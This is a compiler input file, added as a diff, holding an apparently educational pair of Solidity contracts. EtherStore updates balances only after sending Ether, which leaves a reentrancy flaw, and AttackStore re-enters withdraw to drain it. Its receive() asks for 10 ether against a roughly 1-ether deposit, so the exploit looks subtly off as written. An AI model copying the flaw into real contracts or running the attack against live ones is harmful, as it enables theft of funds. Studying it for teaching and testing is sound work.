@@ -1,0 +1,38 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/AttackStore.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\nimport \"./EtherStore.sol\";\n\ncontract AttackStore {\n    EtherStore public etherStore;\n\n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n\n    // Fallback or Recieve is called when EtherStore sends Ether to this contract.\n    receive() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            etherStore.withdraw(10 ether);\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= 1 ether);\n        etherStore.deposit{value: msg.value}();\n        etherStore.withdraw(msg.value);\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n"
+    },
+    "contracts/EtherStore.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\ncontract EtherStore {\n    mapping(address => uint256) public balances;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw(uint256 _amount) external {\n        uint256 bal = balances[msg.sender];\n        require(bal >= _amount);\n\n        (bool sent, ) = msg.sender.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balances[msg.sender] = 0;\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
